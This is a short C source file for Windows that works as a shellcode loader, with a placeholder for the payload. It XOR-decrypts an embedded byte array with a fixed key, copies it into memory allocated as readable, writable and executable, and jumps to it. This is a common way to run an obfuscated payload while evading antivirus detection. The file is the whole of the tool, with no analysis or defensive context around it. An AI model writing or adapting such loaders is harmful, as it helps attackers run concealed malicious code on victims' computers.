#include <windows.h>

unsigned char buf[] = { /* <shellcode> */ };

#define XOR_KEY 0x41

void xor_decrypt(unsigned char* data, unsigned int len, unsigned char key) {
    for (unsigned int i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
    xor_decrypt(buf, sizeof(buf), XOR_KEY);
    void *exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    unsigned char* dst = (unsigned char*)exec;
    for (unsigned int i = 0; i < sizeof(buf); i++) dst[i] = buf[i];
    ((void(*)())exec)();
    return 0;
}
